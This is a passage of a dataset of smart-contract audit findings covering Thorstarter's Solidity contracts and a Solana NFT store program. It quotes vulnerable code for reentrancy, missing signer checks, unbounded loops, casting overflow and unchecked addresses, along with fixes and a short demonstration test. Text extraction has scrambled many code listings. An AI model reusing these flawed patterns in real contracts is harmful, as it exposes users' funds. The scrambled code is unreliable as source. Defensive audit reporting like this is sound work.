test_lptoken_4 () : 3 4 chain . snapshot () print (\" owner_account - PartyOwner () ? -> \" + str ( LpTokenVesting [0]. partyOwner (0 , owner_account . address )) ) LpTokenVesting [0]. toggleOwner (0 , owner_account . address ,{ ' from ': owner_account . address }) print (\" owner_account - PartyOwner () ? -> \" + str ( LpTokenVesting [0]. partyOwner (0 , owner_account . address )) ) chain . revert () 5 6 7 Listing 12: Output of the test 1 owner_account - PartyOwner () ? -> True 2 34 3 Transaction sent : 0 xcf387d3bf616845cf90081ef28e50c0f266d0c2bcaf1ede4b6354d0727ac61cf 4 5 Gas price : 0.0 gwei LpTokenVesting . toggleOwner confirmed Gas limit : 6721975 Nonce : 10 Block : 13037160 Gas used : 17408 (0.26%) 6 7 owner_account - PartyOwner () ? -> False Risk Level: Likelihood - 2 Impact - 3 Recommendation: Use OpenZeppelin Access Control library to manage the different roles of the contracts. Using this OpenZeppelin library the roles can be granted and revoked dynamically via the grantRole and revokeRole functions. Each role has an associated admin role, and only accounts that have a roles admin role can call grantRole and revokeRole. Remediation Plan: SOLVED: Thorstarter Team added a require statement disallowing the owner to disable his own access. First, the owner can promote someone else and only then they can disable the access. 35 ", "labels": ["Halborn", "Thorstarter", "Severity: Low"]}, {"title": "DOS WITH BLOCK GAS LIMIT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always require a certain amount of gas, based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. In the contract LpTokenVestingKeeper.sol, the function run() iterates over an array of vesters of unknown size. If this array is big enough, the transaction could reach the block gas limit and would not be completed. Code Location: Listing 13: LpTokenVestingKeeper.sol (Lines 81) require ( shouldRun () , \" should not run \" ); lastRun = block . timestamp ; for ( uint i = 0; i < lpVestersCount ; i ++) { 78 function run () external { 79 80 81 82 83 84 85 ILpTokenVesting vester = ILpTokenVesting ( lpVesters [i ]) ; uint claimable = vester . claimable (0) ; if ( claimable > 0) { vester . claim (0) ; Risk Level: Likelihood - 2 Impact - 3 36 Recommendation: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. Remediation Plan: RISK ACCEPTED: Thorstarter Team accepts this risk as they will be the only keepers of this contract and will avoid adding too many vesting contracts in that array. 37 ", "labels": ["Halborn", "Thorstarter", "Severity: Low"]}, {"title": "LACK OF ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Every There is no validation of the addresses anywhere in the code. address should be validated and checked that is different than zero. This issue is present in most of the constructors and functions that use addresses as parameters. Code Location examples: Listing 14: Sale.sol (Lines 87,88,96,97) IERC20 _paymentToken , IERC20 _offeringToken , uint _startBlock , uint _endBlock , uint _tokensBlock , uint _offeringAmount , uint _raisingAmount , uint _perUserCap , address _owner , address _keeper ) { 75 constructor ( 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 paymentToken = _paymentToken ; offeringToken = _offeringToken ; startBlock = _startBlock ; endBlock = _endBlock ; tokensBlock = _tokensBlock ; offeringAmount = _offeringAmount ; raisingAmount = _raisingAmount ; perUserCap = _perUserCap ; totalAmount = 0; owner = _owner ; keeper = _keeper ; _validateBlockParams () ; require ( _paymentToken != _offeringToken , ' payment != offering '); 38 100 101 102 } require ( _offeringAmount > 0, ' offering > 0 '); require ( _raisingAmount > 0, ' raising > 0 '); Listing 15: SaleFloating.sol (Lines 90,91,99,100) IERC20 _paymentToken , IERC20 _offeringToken , uint _startBlock , uint _endBlock , uint _tokensBlock , uint _startPrice , uint _priceVelocity , uint _offeringAmount , uint _perUserCap , address _owner , address _keeper 77 constructor ( 78 79 80 81 82 83 84 85 86 87 88 89 ) { 90 91 92 93 94 95 96 97 98 99 100 101 102 paymentToken = _paymentToken ; offeringToken = _offeringToken ; startBlock = _startBlock ; endBlock = _endBlock ; tokensBlock = _tokensBlock ; startPrice = _startPrice ; priceVelocity = _priceVelocity ; offeringAmount = _offeringAmount ; perUserCap = _perUserCap ; owner = _owner ; keeper = _keeper ; _validateBlockParams () ; require ( _paymentToken != _offeringToken , ' payment != offering ' ); require ( _priceVelocity > 0, ' price velocity > 0 '); require ( _offeringAmount > 0, ' offering amount > 0 '); 103 104 105 } Listing 16: EmissionsSplitter.sol (Lines 44,45,46,47) 41 constructor ( address _token , uint _emissionsStart , address _dao , address _team , address _investors , address _ecosystem ) { token = IERC20 ( _token ); emissionsStart = _emissionsStart ; 42 43 39 dao = _dao ; team = _team ; investors = _investors ; ecosystem = _ecosystem ; 44 45 46 47 48 } Listing 17: EmissionsPrivateDispenser.sol (Lines 30) 26 constructor ( address _token , address [] memory investors , uint [] memory percentages ) { token = IERC20 ( _token ); require ( investors . length == percentages . length ); for ( uint i = 0; i < investors . length ; i ++) { investorsPercentages [ investors [ i ]] = percentages [i ]; emit ConfigureInvestor ( investors [ i ], percentages [i ]) ; } 27 28 29 30 31 32 33 } Listing 18: VotersInvestmentDispenser.sol (Lines 28,29) 27 28 29 30 constructor ( address _xruneToken , address _dao ) { xruneToken = IERC20 ( _xruneToken ); dao = IDAO ( _dao ); } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Validate that every address input is different than zero. Remediation Plan: SOLVED: constructors. Thorstarter Team added address validation into all the 40 ", "labels": ["Halborn", "Thorstarter", "Severity: Low"]}, {"title": "VIOLATION OF CHECK, EFFECTS, INTERACTIONS PATTERN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In the contracts Sale.sol and SaleFloating.sol the check, effects, interactions pattern is not being followed in some functions and this could open an attack vector for reentrancy attacks or code inconsistencies. The finalWithdraw() function is already vulnerable to reentrancy and should be corrected. Code Location: Sales.sol Listing 19: Sale.sol (Lines 254) 249 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 250 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 251 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this 252 253 254 255 256 257 258 )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; totalAmountWithdrawn += _paymentAmount ; require ( totalAmountWithdrawn <= raisingAmount , ' can only widthdraw what is owed '); } if ( _offeringAmount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 259 260 } 41 Listing 20: Sale.sol (Lines 187,199) 179 function harvestRefund () public nonReentrant { 180 181 require ( block . number > endBlock , ' not harvest time '); require ( userInfo [ msg . sender ]. amount > 0, ' have you participated ? '); 182 require (! userInfo [ msg . sender ]. claimedRefund , ' nothing to harvest '); paymentToken . safeTransfer ( address ( msg . sender ) , amount ); uint amount = getRefundingAmount ( msg . sender ); if ( amount > 0) { } userInfo [ msg . sender ]. claimedRefund = true ; emit HarvestRefund ( msg . sender , amount ); 183 184 185 186 187 188 189 } 190 191 function harvestTokens () public nonReentrant { 192 193 require ( block . number > tokensBlock , ' not harvest time '); require ( userInfo [ msg . sender ]. amount > 0, ' have you participated ? '); 194 require (! userInfo [ msg . sender ]. claimedTokens , ' nothing to harvest '); uint amount = getOfferingAmount ( msg . sender ); if ( amount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , amount ); } userInfo [ msg . sender ]. claimedTokens = true ; emit HarvestTokens ( msg . sender , amount ); 195 196 197 198 199 200 201 } SaleFloating.sol Listing 21: SaleFloating.sol (Lines 182,183,199) 164 function harvestTokens () public nonReentrant { 165 166 167 require (! paused , ' paused '); require ( block . number > tokensBlock , ' not harvest time '); require ( userInfo [ msg . sender ]. amount > 0, ' have you participated ? '); 168 require (! userInfo [ msg . sender ]. claimedTokens , ' nothing to harvest '); uint amount = getOfferingAmount ( msg . sender ); if ( amount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , amount ); 169 170 171 42 } userInfo [ msg . sender ]. claimedTokens = true ; emit HarvestTokens ( msg . sender , amount ); 172 173 174 175 } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Follow the check, effects, interactions pattern. For the finalWithdraw() function another suggestion is using the nonReentrant modifier. Remediation Plan: Thorstarter Team SOLVED: the check,effects,interactions pattern into the functions finalWithdraw(), harvestRefund() and harvestTokens(). successfully implemented has 43 ", "labels": ["Halborn", "Thorstarter", "Severity: Low"]}, {"title": "INCOMPATIBILITY WITH INFLATIONARY TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In multiple functions Thorstarter uses OpenZeppelins safeTransferFrom and safeTransfer to handle the token transfers. These functions call transferFrom and transfer internally in the token contract to actually execute the transfer. However, since the actual amount transferred ie. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom ERC20 token with the transferFrom or transfer function modified in such a way that it e.g. does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. Code Location: Sale.sol Listing 22: Sale.sol 169 paymentToken . safeTransferFrom ( address ( msg . sender ) , address ( this ) , _amount ); Listing 23: Sale.sol 185 paymentToken . safeTransfer ( address ( msg . sender ) , amount ); Listing 24: Sale.sol 197 offeringToken . safeTransfer ( address ( msg . sender ) , amount ); Listing 25: Sale.sol (Lines 253,258) 249 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 44 250 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 251 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this 252 253 254 255 256 257 258 )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; totalAmountWithdrawn += _paymentAmount ; require ( totalAmountWithdrawn <= raisingAmount , ' can only widthdraw what is owed '); } if ( _offeringAmount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 259 260 } SaleFloating.sol Listing 26: SaleFloating.sol 180 paymentToken . safeTransferFrom ( address ( msg . sender ) , address ( this ) , _amount ); Listing 27: SaleFloating.sol 197 offeringToken . safeTransfer ( address ( msg . sender ) , amount ); Listing 28: SaleFloating.sol (Lines 224,227) 220 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 221 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 222 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; } if ( _offeringAmount > 0) { 223 224 225 226 45 227 offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 228 229 } EmissionsPrivateDispenser.sol Listing 29: EmissionsPrivateDispenser.sol (Lines 52,57) uint amount = claimable ( msg . sender ); require ( amount > 0, \" nothing to claim \" ); investorsClaimedAmount [ msg . sender ] += amount ; token . safeTransfer ( msg . sender , amount ); emit Claim ( msg . sender , amount ); 48 function claim () public { 49 50 51 52 53 54 } 55 56 function deposit ( uint amount ) public { 57 58 59 60 } token . safeTransferFrom ( msg . sender , address ( this ) , amount ); totalReceived += amount ; emit Deposit ( amount ); LpTokenVestingKeeper.sol Listing 30: LpTokenVestingKeeper.sol (Lines 115) 112 xruneToken . safeApprove ( dao . voters () , ( amount * 35) / 100) ; 113 IVoters ( dao . voters () ). donate (( amount * 35) / 100) ; 114 115 xruneToken . safeTransfer ( grants , ( amount * 5) / 100) ; 116 117 // Send the leftover 25% to the DAO 118 xruneToken . transfer ( address ( dao ) , xruneToken . balanceOf ( address ( this ))); 119 emit Claim ( lpVesters [i ], lpVestersSnapshotIds [ i], amount ); LpTokenVesting.sol 46 Listing 31: LpTokenVesting.sol 100 IERC20 ( pair () ). safeTransfer ( msg . sender , amount ); Listing 32: LpTokenVesting.sol 166 IERC20 ( token ). safeTransfer ( msg . sender , amount ); VotersInvestmentDispenser.sol Listing 33: VotersInvestmentDispenser.sol (Lines 46,53,61) uint amount = claimable ( snapshotId , msg . sender ); if ( amount > 0) { claimedAmounts [ snapshotId ][ msg . sender ] += amount ; claimedAmountsTotals [ snapshotId ] += amount ; xruneToken . safeTransfer ( msg . sender , amount ); emit Claim ( snapshotId , msg . sender , amount ); 41 function claim ( uint snapshotId ) public { 42 43 44 45 46 47 48 49 } 50 51 // Used by LpTokenVestingKeeper 52 function deposit ( uint snapshotId , uint amount ) public { 53 } xruneToken . safeTransferFrom ( msg . sender , address ( this ) , amount ) ; snapshotAmounts [ snapshotId ] += amount ; emit Deposit ( snapshotId , amount ); 54 55 56 } 57 58 // Allow DAO to get tokens out and migrate to a different contract 59 function withdraw ( address token , uint amount ) public { require ( msg . sender == address ( dao ) , '! DAO '); 60 IERC20 ( token ). safeTransfer ( address ( dao ) , amount ); 61 62 } EmissionsSplitter.sol Listing 34: EmissionsSplitter.sol 99 token . safeTransfer ( team , teamAmount ); 47 Listing 35: EmissionsSplitter.sol 113 token . safeTransfer ( team , teamAmount ); Listing 36: EmissionsSplitter.sol (Lines 123,127) sentToEcosystem += ecosystemAmount ; amount -= ecosystemAmount ; token . safeTransfer ( ecosystem , ecosystemAmount ); 120 if ( ecosystemAmount > 0) { 121 122 123 124 } 125 126 if ( amount > 0) { 127 128 } token . safeTransfer ( dao , amount ); OpenZeppelin Listing 37: Library SafeERC20 (Lines 20,25,28,34) using Address for address ; 17 library SafeERC20 { 18 19 20 21 22 23 24 25 function safeTransfer ( IERC20 token , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transfer . selector , to , value )) ; } function safeTransferFrom ( IERC20 token , address from , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transferFrom . selector , from , to , value )) ; } 26 27 28 29 30 31 32 33 34 35 48 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Whenever tokens are transferred, the delta of the previous (before transfer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: RISK ACCEPTED: Thorstarter Team claims that most of the tokens addresses are contracts self-deployed by Thorstarter or check before hand. 49 3.10 (HAL-10) USE OF BLOCK.TIMESTAMP - LOW ", "labels": ["Halborn", "Thorstarter", "Severity: Informational"]}, {"title": "ANONYMOUS SELL ORDER CANCELLING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Owners can place sell orders on their NFTs by sending either a ListNftForSale instruction or a ListEditionForSale instruction to the program. Either instruction handler transfers the tokens authority to an account address derived from the programs ID and a static seed and creates an order account. This account stores the ask price, NFT mint and several other parameters. Sellers may choose to cancel their orders before theyre filled. To accom- plish that, they can send either a CancelNftSale or a CancelEditionSale. Either instruction handler transfers the NFTs authority back to the seller (NFT owner) and closes the order account, sending the rent back to the seller. However, because neither the CancelNftSale instruction handler nor the CancelEditionSale instruction handler verifies if the NFT owner is, in fact, a transaction signer, an anonymous attacker may cause a DoS of the program by cancelling all sell orders. Code Location: Listing 1: processor/cancel_listing.rs (Lines 22) 20 pub fn process_cancel_listing ( accounts : &[ AccountInfo ], program_id 21 22 23 24 25 : & Pubkey ) -> ProgramResult { let account_info_iter = & mut accounts . iter () ; let seller_wallet_account = next_account_info ( account_info_iter ) ?; let selling_nft_token_account = next_account_info ( account_info_iter ) ?; let sell_order_data_storage_account = next_account_info ( account_info_iter ) ?; let nft_store_signer_pda_account = next_account_info ( account_info_iter ) ?; 13 26 let token_program = next_account_info ( account_info_iter ) ?; The only check performed on the seller account by the instruction handler. Listing 2: processor/cancel_listing.rs (Lines 63) 63 if sell_order_data . seller_wallet ! = * seller_wallet_account . key { 64 65 66 } msg! ( \" PhantasiaError :: SellerMismatched \" ); return Err ( PhantasiaError :: SellerMismatched . into () ); Listing 3: processor/cancel_edition_listing.rs (Lines 25) accounts : &[ AccountInfo ], program_id : & Pubkey , 20 pub fn process_cancel_edition_listing ( 21 22 23 ) -> ProgramResult { 24 25 let account_info_iter = & mut accounts . iter () ; let seller_wallet_account = next_account_info ( account_info_iter ) ?; 26 27 28 29 let selling_nft_token_account = next_account_info ( account_info_iter ) ?; let sell_order_data_storage_account = next_account_info ( account_info_iter ) ?; let nft_store_signer_pda_account = next_account_info ( account_info_iter ) ?; let token_program = next_account_info ( account_info_iter ) ?; 14 The only check performed on the seller account by the instruction handler. Listing 4: processor/cancel_edition_listing.rs (Lines 66) 66 if sell_order_data . seller_wallet ! = * seller_wallet_account . key { 67 68 69 } msg! ( \" PhantasiaError :: SellerMismatched \" ); return Err ( PhantasiaError :: SellerMismatched . into () ); Risk Level: Likelihood - 5 Impact - 4 Recommendation: Verify if the NFT owner (seller) is indeed the signer of CancelNftSale and CancelEditionSale instructions before updating the state. Remediation Plan: The Phantasia Sports SOLVED: commit team 5a1b332897736200f6d793852891ac179144c48d: the transaction signer public key is verified to match the seller_wallet account address saved in the sale order. fixed issue this in 15 ", "labels": ["Halborn", "Phantasia_Sports_NFT_Store_SPA_Solana_Program", "Severity: High"]}, {"title": "HARDCODED VAULT ADDRESS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "requires compiler the environment the Rust TREASURY_ATA_PUBKEY program. The BuyNft and BuyEdition instruction handlers use the value of this variable to get the fee vault address. Since this address is hardcoded at compile time, it cannot be modified without redeploying the program if the account compromised. developer to program variable to the build set Code Location: Listing 5: processor/buy_nft.rs (Lines 46) \" TREASURY_ATA_PUBKEY \" , \" Must specify a treasury ATA account public key! \" 45 let transaction_fee_fant_ata_id = Pubkey :: from_str ( env! ( 46 47 48 )) 49 . map_err (| _ | PhantasiaError :: StringToPubkeyConversionFailed ) ?; 50 if * transaction_fee_fant_ata . key ! = transaction_fee_fant_ata_id { 51 52 \" PhantasiaError :: TransactionFeeFantAtaMismatched EXPECTED : msg! ( {:?} ACTUAL : {:?} \" , transaction_fee_fant_ata_id , transaction_fee_fant_ata . key ); return Err ( PhantasiaError :: TransactionFeeFantAtaMismatched . into () ); 53 54 55 56 57 } Listing 6: processor/buy_edition.rs (Lines 58) \" TREASURY_ATA_PUBKEY \" , \" Must specify a treasury ATA account public key! \" 57 let transaction_fee_fant_ata_id = Pubkey :: from_str ( env! ( 58 59 60 )) 61 . map_err (| _ | PhantasiaError :: StringToPubkeyConversionFailed ) ?; 16 62 if * transaction_fee_fant_ata . key ! = transaction_fee_fant_ata_id { 63 64 \" PhantasiaError :: TransactionFeeFantAtaMismatched EXPECTED : msg! ( {:?} ACTUAL : {:?} \" , transaction_fee_fant_ata_id , transaction_fee_fant_ata . key ); return Err ( PhantasiaError :: TransactionFeeFantAtaMismatched . into () ); 65 66 67 68 69 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: Implement a governance function to update the fee vault address. Remediation Plan: ACKNOWLEDGED: The Phantasia Sports team accepts the risk of this finding. 17 ", "labels": ["Halborn", "Phantasia_Sports_NFT_Store_SPA_Solana_Program", "Severity: Medium"]}, {"title": "NFT ORDER TYPE MISMATCH", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "SellOrder and The program creates two types of NFT sell orders: NFTs may be either single- or multiple edition. LimitedEditionSale. Editions are Edition ID is stored in NFT metadata as edition_nonce. identified with u8 integer, but for single edition NFTs this property is set to None. Neither the ListNftForSale nor the ListEditionForSale instruction handler checks the value of the edition_nonce property, which means the NFT owner may place a SellOrder order for a multiple edition NFT and a LimitedEditionSale order for a single edition NFT. Code Location: Listing 7: processor/list_nft.rs (Lines 158,161) selling_nft_token_account . lamports () , selling_nft_token_account . data_len () , msg! ( \" PhantasiaError :: NotRentExempt \" ); return Err ( PhantasiaError :: NotRentExempt . into () ); 150 if !rent . is_exempt ( 151 152 153 ) { 154 155 156 } 157 158 validate_nft ( 159 160 161 162 163 ) ?; selling_nft_mint_account , selling_nft_token_account , selling_nft_metadata_account , seller_wallet_account . key , 18 Listing 8: processor/list_nft.rs (Lines 57) nft_mint : & AccountInfo , nft_token_account : & AccountInfo , metadata_info : & AccountInfo , seller_wallet_pubkey : & Pubkey , 43 pub fn validate_nft ( 44 45 46 47 48 ) -> ProgramResult { 49 50 51 52 53 54 55 56 57 58 59 60 61 let verified_creators : [ Pubkey ; NUM_VERIFIED_CREATORS ] = [ vc1_id :: id () , // This is our main wallet vc2_id :: id () , vc3_id :: id () , vc4_id :: id () , vc5_id :: id () , vc6_id :: id () , // Phanbot creator ]; validate_metadata_account ( metadata_info , nft_mint . key ) ?; if * nft_token_account . owner != spl_token :: id () { msg! (\" PhantasiaError :: AccountOwnerShouldBeTokenProgram \" ); return Err ( PhantasiaError :: AccountOwnerShouldBeTokenProgram . into () ); 62 } Listing 9: processor/list_nft.rs (Lines 57) nft_mint : & AccountInfo , nft_token_account : & AccountInfo , metadata_info : & AccountInfo , seller_wallet_pubkey : & Pubkey , 43 pub fn validate_nft ( 44 45 46 47 48 ) -> ProgramResult { 49 50 51 52 53 54 55 56 57 58 59 60 let verified_creators : [ Pubkey ; NUM_VERIFIED_CREATORS ] = [ vc1_id :: id () , // This is our main wallet vc2_id :: id () , vc3_id :: id () , vc4_id :: id () , vc5_id :: id () , vc6_id :: id () , // Phanbot creator ]; validate_metadata_account ( metadata_info , nft_mint . key ) ?; if * nft_token_account . owner != spl_token :: id () { msg! (\" PhantasiaError :: AccountOwnerShouldBeTokenProgram \" ); 19 61 62 } return Err ( PhantasiaError :: AccountOwnerShouldBeTokenProgram . into () ); Listing 10: processor/list_nft.rs 252 pub fn validate_metadata_account ( metadata_info : & AccountInfo , nft_mint : & Pubkey ) -> ProgramResult { verify_metadata_account_owner ( metadata_info . owner ) ?; let metadata_program_id = metadata_program_id :: id () ; let metadata_seeds = &[ metaplex_state :: PREFIX . as_bytes () , metadata_program_id . as_ref () , nft_mint . as_ref () , ]; let ( metadata_address , _ ) = Pubkey :: find_program_address ( metadata_seeds , & metadata_program_id :: id () ); if metadata_address ! = * metadata_info . key { msg! (\" PhantasiaError :: MetadataAccountMismatched \" ); return Err ( PhantasiaError :: MetadataAccountMismatched . into 253 254 255 256 257 258 259 260 261 262 263 264 265 () ); 266 267 268 } } Ok (() ) Risk Level: Likelihood - 2 Impact - 2 Recommendation: Check the edition_nonce value before creating and placing sell orders. 20 Remediation Plan: The Phantasia Sports commit SOLVED: the value of edition_nonce 6b36c56025ae1ed8bfc869dc7015413a25e1b8b3: is checked in the validate_nft function, used by ListNftForSale and ListEditionForSale, to verify that it is expected sales order type. issue fixed this team in 21 ", "labels": ["Halborn", "Phantasia_Sports_NFT_Store_SPA_Solana_Program", "Severity: Low"]}, {"title": "FANT AMOUNT CASTING OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "The program calculates the FANT amount the seller receives with the get_fants_to_receive_from_basis_points function. This function takes a u64 selling_price and u16 basis_points and performs some arithmetic op- erations on them. The result is cast to u64 to match the type of the amount field of SPL Tokens Account struct. Before casting however the result is not verified to not exceed the maximum value allowed by the u64 type which can lead to integer overflow. Code Location: Listing 11: processor/buy_nft.rs (Lines 206) selling_price : u64 , basis_points : u16 , let amount_to_receive = ( selling_price as u128 ) 198 pub fn get_fants_to_receive_from_basis_points ( 199 200 201 ) -> Result < u64 , ProgramError > { 202 203 204 205 206 207 208 } . checked_mul ( basis_points as u128 ) . ok_or ( PhantasiaError :: MathOverflow )? . checked_div (10000 u128 ) . ok_or ( PhantasiaError :: MathOverflow )? as u64 ; return Ok ( amount_to_receive ); Risk Level: Likelihood - 2 Impact - 2 22 Recommendation: Verify amount_to_receive does not exceed u64::MAX before casting it to u64. Remediation Plan: The Phantasia Sports commit SOLVED: 6b36c56025ae1ed8bfc869dc7015413a25e1b8b3: is verified to not exceed the maximum value allowed by the u64 type to avoid an integer overflow. amount_to_receive issue fixed team this the in 23 ", "labels": ["Halborn", "Phantasia_Sports_NFT_Store_SPA_Solana_Program", "Severity: Low"]}, {"title": "EDITION SELL ORDER PARAMETER SANITY CHECK MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "The ListEditionForSale instruction handler requires the NFT owner to The provide some parameters, including number_to_sell and num_sold. former denotes the total number of NTFs available, and the latter stores the number of NFTs sold to date. The handler does not verify if num_sold is lower than number_to_sell which means it is possible to place a sell order on an NFT edition where the number of sold tokens exceeds the number of tokens available for sale. Code Location: Listing 12: processor/list_edition.rs (Lines 23,24) accounts : &[ AccountInfo ], program_id : & Pubkey , sale_price : u64 , number_to_sell : u16 , num_sold : u16 19 pub fn process_list_edition_nft ( 20 21 22 23 24 25 ) -> ProgramResult { 26 27 let account_info_iter = & mut accounts . iter () ; let seller_wallet_account = next_account_info ( account_info_iter ) ?; Listing 13: processor/list_edition.rs (Lines 118,119) 113 let sell_order_data : LimitedEditionSale = LimitedEditionSale { 114 115 116 117 118 acc_type : AccTypesWithVersion :: LimitedEditionSaleDataV1 as u8 , seller_wallet : * seller_wallet_account . key , nft_token : * selling_nft_token_account . key , selling_price : sale_price , number_purchased : num_sold , 24 119 120 121 }; number_to_sell : number_to_sell , nonce : bump_seed , Risk Level: Likelihood - 1 Impact - 1 Recommendation: Verify num_sold is a lower number than number_to_sell before placing the sell order. Remediation Plan: The Phantasia Sports SOLVED: 32ff199c83cdedf061aaeef706c75c9a4c7ed510: the num_sold is verified not to exceed the number of available tokens, number_to_sell. commit fixed issue team this in 25 ", "labels": ["Halborn", "Phantasia_Sports_NFT_Store_SPA_Solana_Program", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF HELPER METHODS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "The intention and use of helper methods in Rust, like unwrap, is very useful for testing environments because a value is forcibly demanded to get an error (aka panic!) if the Option the methods is called on doesnt have Some value or Result. Nevertheless, leaving unwrap functions in production environments is a bad practice because not only will this In addition, no helpful cause the program to crash out, or panic!. messages are shown to help the user solve, or understand the reason of the error. Code Location: Listing 14: processor/list_nft.rs (Lines 103) 102 let metadata = Metadata :: from_account_info ( metadata_info ) ?; 103 let nft_creators = metadata . data . creators . unwrap () ; 104 let mut is_fake_nft = true ; 105 for creator in nft_creators { 106 if creator . verified && is_verified_creator (& creator . address , & verified_creators )? { is_fake_nft = false ; break ; 107 108 109 110 } } Risk Level: Likelihood - 1 Impact - 1 26 Recommendation: It is recommended not use the unwrap function in production environment because this use provokes panic! and may crash the contract without verbose error messages. Crashing the system will result in a loss of availability, and in some cases, even private information stored in the Some alternatives are possible, such as propagating the error state. with ? instead of unwrap, or using the error-chain crate for errors. Remediation Plan: The Phantasia Sports SOLVED: commit unwrap 68463a47fdd1a9be18b14ead9891806cb96be9d9: function has been removed and replaced by more secure methods such as error propagation. issue of in the fixed team this use any 27 ", "labels": ["Halborn", "Phantasia_Sports_NFT_Store_SPA_Solana_Program", "Severity: Informational"]}, {"title": "BUYING NFTS AS A DELEGATE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Both BuyNft and BuyEdition instruction handlers expect the transaction sender to provide the buyer_nft_fant_ata FANT token account to charge and buyer_wallet_account to authorize the transfer. If is buyer_wallet_account. transferred successful, authority NFTs the to is it In the SPL Token program, an account delegate is defined as an account authorized to transfer an owner-approved share of tokens out of the account. Neither the BuyNft nor BuyEdition instruction handler verifies if buyer_wallet_account is the owner of the buyer_nft_fant_ata account rather than just a delegate which means if the transaction is signed by a delegate, the NFTs authority will be transferred to the delegate instead of the buyer_nft_fant_ata account owner. Code Location: Listing 15: processor/buy_nft.rs (Lines 29,30) 27 pub fn process_buy_nft ( accounts : &[ AccountInfo ], program_id : & Pubkey ) -> ProgramResult { let account_info_iter = & mut accounts . iter () ; let buyer_wallet_account = next_account_info ( account_info_iter ) ?; let buyer_nft_fant_ata = next_account_info ( account_info_iter ) 28 29 30 ?; 28 Listing 16: processor/buy_nft.rs (Lines 40) 40 if !buyer_wallet_account . is_signer { 41 42 43 msg! (\" ProgramError :: MissingRequiredSignature \" ); return Err ( ProgramError :: MissingRequiredSignature ); } 29 the only check on buyer_wallet_account Listing 17: processor/buy_nft.rs (Lines 40) 40 if !buyer_wallet_account . is_signer { 41 42 43 msg! (\" ProgramError :: MissingRequiredSignature \" ); return Err ( ProgramError :: MissingRequiredSignature ); } Listing 18: processor/buy_edition.rs (Lines 36,47) 35 let mint_authority_info = next_account_info ( account_info_iter ) ?; 36 let buyer_wallet_account = next_account_info ( account_info_iter ) ?; 37 let nft_store_signer_pda_account = next_account_info ( account_info_iter ) ?; 38 let 